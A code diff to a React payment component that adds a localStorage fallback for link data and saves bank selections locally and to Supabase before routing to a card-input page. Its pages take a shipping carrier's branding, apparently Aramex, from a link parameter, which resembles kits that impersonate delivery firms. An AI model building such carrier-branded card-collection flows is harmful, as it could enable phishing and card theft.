@@ -23,20 +23,24 @@ const PaymentBankSelector = () => {
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
   
-  // Get country from link data
-  const countryCode = linkData?.country_code || "";
+  // Fallback to localStorage if linkData is not available
+  const localData = id ? localStorage.getItem(`payment_${id}`) : null;
+  const localPayload = localData ? JSON.parse(localData) : null;
+  
+  // Get country from link data or localStorage
+  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || localPayload?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   
   // Get preselected bank from link payload if available
-  const preselectedBank = linkData?.payload?.selected_bank;
+  const preselectedBank = linkData?.payload?.selected_bank || localPayload?.selected_bank;
   
-  // Get customer info from link data (cross-device compatible)
-  const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  // Get customer info from link data or localStorage (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || localPayload?.customerInfo || {};
+  const serviceKey = linkData?.payload?.service_key || localPayload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || localPayload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = (linkData?.payload || localPayload) as any;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
@@ -79,22 +83,28 @@ const PaymentBankSelector = () => {
   };
   
   const handleSkip = async () => {
-    if (!linkData) return;
-
     // Save to link for cross-device compatibility
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: 'skipped',
-      };
+    const updatedPayload = {
+      ...(linkData?.payload || localPayload || {}),
+      selectedCountry: countryCode,
+      selectedBank: 'skipped',
+    };
 
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-      console.error('Error saving bank selection:', error);
+    // Save to localStorage as fallback
+    if (id) {
+      localStorage.setItem(`payment_${id}`, JSON.stringify(updatedPayload));
+    }
+
+    // Try to save to Supabase if available
+    if (linkData) {
+      try {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      } catch (error) {
+        console.error('Error saving bank selection:', error);
+      }
     }
 
     toast({
@@ -106,29 +116,37 @@ const PaymentBankSelector = () => {
   };
 
   const handleContinue = async () => {
-    if (!linkData || !selectedBank) return;
+    if (!selectedBank) return;
 
     // Save to link for cross-device compatibility
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: selectedBank,
-      };
+    const updatedPayload = {
+      ...(linkData?.payload || localPayload || {}),
+      selectedCountry: countryCode,
+      selectedBank: selectedBank,
+    };
 
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-      console.error('Error saving bank selection:', error);
+    // Save to localStorage as fallback
+    if (id) {
+      localStorage.setItem(`payment_${id}`, JSON.stringify(updatedPayload));
+    }
+
+    // Try to save to Supabase if available
+    if (linkData) {
+      try {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      } catch (error) {
+        console.error('Error saving bank selection:', error);
+      }
     }
 
     navigate(`/pay/${id}/card-input`);
   };
   
-  // Show loading state while fetching link data
-  if (linkLoading || !linkData) {
+  // Show loading state only while fetching (not if data is missing)
+  if (linkLoading) {
     return (
       <div 
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
